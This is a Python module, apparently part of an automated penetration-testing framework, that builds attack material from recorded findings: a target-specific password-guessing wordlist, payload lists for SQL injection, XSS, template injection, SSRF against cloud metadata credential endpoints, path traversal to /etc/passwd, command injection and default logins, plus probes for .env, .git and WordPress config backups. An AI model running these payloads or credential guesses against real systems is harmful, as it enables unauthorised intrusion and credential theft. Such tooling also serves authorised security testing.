import re
from core.timeutil import utcnow

from sqlalchemy import select

from core import wordlists as wl
from core.models import Finding
from core.triage import is_actionable_finding
from .base import BaseAgent


class Hephaestus(BaseAgent):
    name = "hephaestus"
    symbol = "BR"
    display_name = "BROKKR"
    role = "Payload Forge"

    async def execute(self, target: str, context: dict = None) -> dict:
        hermes = (context or {}).get("hermes", {})
        ares = (context or {}).get("ares", {})

        await self.log("Analyzing findings to forge targeted payloads and wordlists", "info")

        result = {
            "payloads_generated": [],
            "wordlists_created": [],
            "exploitable_targets": [],
            "forge_report": {},
        }

        technologies = hermes.get("technologies", {})
        vendors = hermes.get("vendors", [])
        domain = hermes.get("domain", target)

        # Source of truth: every finding in the DB. The offensive engine writes
        # SQLi/XSS/SSRF/SSTI/ZAP results straight there, not into
        # ares["vulnerabilities"] (which holds only the nuclei template hits).
        rows = await self.session.execute(
            select(Finding).where(Finding.mission_id == self.mission_id)
        )
        all_findings = [f for f in rows.scalars().all()
                        if (f.tag or "").lower() != "false_positive"]
        # Actionable = critical/high always, medium real injection/access-control
        # signals (SQLi/XSS/traversal/SSRF/SSTI/IDOR/...), and MIMIR "Attack Path:"
        # findings regardless of severity. Plain hygiene findings (SPF/DMARC/
        # staging exposure) never qualify on their own — only if MIMIR chains them.
        actionable = [f for f in all_findings if is_actionable_finding(f.title, f.severity)]

        await self.log(
            f"Forging from {len(actionable)} actionable finding(s) of {len(all_findings)} total "
            f"+ {len(technologies)} tech fingerprints + {len(vendors)} vendors",
            "info",
        )

        # 1) Deterministic content-discovery wordlist from recon (no AI).
        discovered_paths = [d.get("url", "") for d in ares.get("directories", []) if d.get("url")]
        try:
            entry = wl.build_target_list(self.mission_id, hermes, discovered_paths)
            result["wordlists_created"].append(entry)
            await self.log(
                f"Content-discovery wordlist: {entry['count']} entries -> {entry['id']}",
                "success",
            )
        except Exception as e:
            await self.log(f"Content wordlist generation failed: {e}", "warn")

        # 2) Credential wordlist (target-flavored password guesses).
        creds = self._build_credentials(domain, vendors, technologies)
        try:
            centry = wl.write_list(f"creds-{wl.slugify(domain)}", creds)
            result["wordlists_created"].append(centry)
            await self.log(f"Credential wordlist: {centry['count']} entries -> {centry['id']}", "success")
        except Exception as e:
            await self.log(f"Credential wordlist write failed: {e}", "warn")

        # 3) Payload sets for each actionable finding, classified by its title.
        seen_targets = set()
        for f in actionable:
            cls = self._classify(f.title)
            if not cls:
                continue
            url = self._target_from_evidence(f.evidence) or f"https://{domain}"
            payloads = self._payloads_for_class(cls, url)
            if payloads:
                result["payloads_generated"].extend(payloads)
                if url not in seen_targets:
                    seen_targets.add(url)
                    result["exploitable_targets"].append(url)

        result["payloads_generated"].extend(self._generic_web_payloads(technologies))

        result["forge_report"] = {
            "domain": domain,
            "total_payloads": len(result["payloads_generated"]),
            "exploitable_count": len(result["exploitable_targets"]),
            "wordlists": [w["id"] for w in result["wordlists_created"]],
            "wordlist_entries": sum(w["count"] for w in result["wordlists_created"]),
            "timestamp": utcnow().isoformat(),
        }

        await self.log(
            f"Forge complete: {len(result['payloads_generated'])} payloads | "
            f"{len(result['wordlists_created'])} wordlists | "
            f"{len(result['exploitable_targets'])} exploitable targets",
            "success",
        )
        return result

    def _build_credentials(self, domain: str, vendors: list, technologies: dict) -> list:
        words = set()
        parts = domain.split(".")
        company = parts[0] if parts else domain

        for p in parts:
            if len(p) > 2:
                words.update([p, p.lower(), p.capitalize(),
                              p + "123", p + "2024", p + "2025", p + "!"])

        words.update([
            company, company.lower(), company.upper(), company.capitalize(),
            company + "@123", company + "123!", company + "2024!", company + "@2025",
            company + "_admin", company + "_dev", "admin_" + company,
            company[:4] + "2024", company[:4] + "!", "P@ss" + company,
        ])

        for v in vendors:
            vendor = v.get("vendor", "") if isinstance(v, dict) else str(v)
            first = vendor.split()[0].lower() if vendor.split() else ""
            if first:
                words.update([first + "2024!", first + "@123"])

        all_techs = []
        for tl in technologies.values():
            all_techs.extend(tl)
        if any("WordPress" in t for t in all_techs):
            words.update(["admin", "password", "wordpress", "wp-admin", "admin123", "letmein"])
        if any("Drupal" in t for t in all_techs):
            words.update(["drupal", "admin", "password1", "admin@drupal"])

        words.update([
            "Password1", "Password1!", "Welcome1", "Welcome1!",
            "Summer2024!", "Winter2024!", "Spring2025!", "Fall2024!",
            "January@1", "Admin@123", "Letmein1!", "Changeme1",
            "Qwerty123!", "Company1!", "123456Aa!",
        ])
        return sorted(words)

    def _classify(self, title: str) -> str:
        """Map a finding title to a vulnerability class for payload forging."""
        t = (title or "").lower()
        if "sql injection" in t or "sqli" in t:
            return "sqli"
        if "template injection" in t or "ssti" in t:
            return "ssti"
        if "cross site scripting" in t or "cross-site scripting" in t or "xss" in t:
            return "xss"
        if "request forgery" in t or "ssrf" in t:
            return "ssrf"
        if "path traversal" in t or "lfi" in t or "local file" in t or "file inclusion" in t:
            return "lfi"
        if "open redirect" in t:
            return "openredirect"
        if "command injection" in t or "remote code" in t or " rce" in t:
            return "rce"
        if "idor" in t or "object level" in t or "object reference" in t:
            return "idor"
        if "default" in t and ("cred" in t or "login" in t or "password" in t):
            return "defaultcreds"
        return ""

    def _target_from_evidence(self, evidence: str) -> str:
        """Pull the affected URL out of a finding's evidence text."""
        if not evidence:
            return ""
        m = re.search(r"URL:\s*(\S+)", evidence)
        if m:
            return m.group(1).strip()
        m = re.search(r"https?://\S+", evidence)
        return m.group(0).strip() if m else ""

    def _payloads_for_class(self, cls: str, url: str) -> list:
        sets = {
            "sqli": ("SQLi", ["' OR '1'='1", "' OR 1=1--", "admin'--",
                              "1' AND SLEEP(5)--", "1 UNION SELECT NULL--"]),
            "xss": ("XSS", ["<script>alert(document.domain)</script>",
                            "\"><img src=x onerror=alert(document.domain)>",
                            "javascript:alert(1)"]),
            "ssti": ("SSTI", ["{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "#{7*7}",
                              "{{''.__class__.__mro__[1].__subclasses__()}}"]),
            "ssrf": ("SSRF", ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                              "http://metadata.google.internal/computeMetadata/v1/",
                              "file:///etc/passwd", "http://127.0.0.1:80/"]),
            "lfi": ("LFI", ["../../../../etc/passwd", "....//....//....//etc/passwd",
                            "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00"]),
            "openredirect": ("OpenRedirect", ["https://evil.example", "//evil.example",
                                              "https:/evil.example"]),
            "rce": ("RCE", [";id", "|id", "$(id)", "`id`", "& whoami"]),
            "idor": ("IDOR", ["increment/decrement the object id and replay the request"]),
            "defaultcreds": ("DefaultCreds", ["admin:admin", "admin:password",
                                              "admin:123456", "root:root"]),
        }
        kind, payloads = sets.get(cls, ("", []))
        return [{"type": kind, "payload": p, "target": url} for p in payloads]

    def _generic_web_payloads(self, technologies: dict) -> list:
        all_techs = []
        for tl in technologies.values():
            all_techs.extend([t.lower() for t in tl])

        payloads = [
            {"type": "Recon", "payload": "/../../../etc/passwd", "note": "Path traversal"},
            {"type": "Recon", "payload": "/.git/HEAD", "note": "Git exposure"},
            {"type": "Recon", "payload": "/.env", "note": "Environment file"},
            {"type": "Recon", "payload": "/robots.txt", "note": "Robots disclosure"},
            {"type": "Recon", "payload": "/sitemap.xml", "note": "Sitemap enum"},
        ]
        if any("php" in t for t in all_techs):
            payloads.extend([
                {"type": "PHP", "payload": "<?php phpinfo(); ?>", "note": "PHP info probe"},
                {"type": "PHP", "payload": "/?page=../../../../etc/passwd", "note": "PHP LFI"},
            ])
        if any("wordpress" in t for t in all_techs):
            payloads.extend([
                {"type": "WordPress", "payload": "/wp-json/wp/v2/users", "note": "User enum via API"},
                {"type": "WordPress", "payload": "/wp-content/debug.log", "note": "Debug log"},
                {"type": "WordPress", "payload": "/wp-config.php.bak", "note": "Config backup"},
            ])
        return payloads
